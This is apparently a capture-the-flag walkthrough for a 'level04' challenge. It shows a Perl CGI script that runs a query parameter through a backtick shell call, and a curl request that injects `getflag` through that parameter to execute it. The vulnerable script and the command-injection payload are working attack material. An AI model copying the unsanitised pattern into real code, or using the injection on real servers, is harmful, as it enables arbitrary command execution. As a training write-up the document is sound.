- List the files in level04 user home directory to find 'level04.pl' perl script which belongs to flag04 user.

- Take a look at the code inside.

`cat ./level04.pl`
#!/usr/bin/perl
# localhost:4747
use CGI qw{param}; # Common Gateway Interface, standard for web server and script exchanges
print "Content-type: text/html\n\n";
sub x { # subroutine (aka function) x definition
  $y = $_[0];
  print `echo $y 2>&1`; # print the output of the 'echo $y' command 
}
x(param("x")); # call the subroutine x with the value corresponding to the key "x" of param 

- After dissecting the script content, we understand that it is executed from a web server hosted on local machine and reachable via the port 4747

- Send a request to the script and supply it the parameter 'x=`getflag`' to make it execute getflag, echo its output, then print the output of the echo command.

`curl 'localhost:4747/level04.pl?x=`getflag`'`
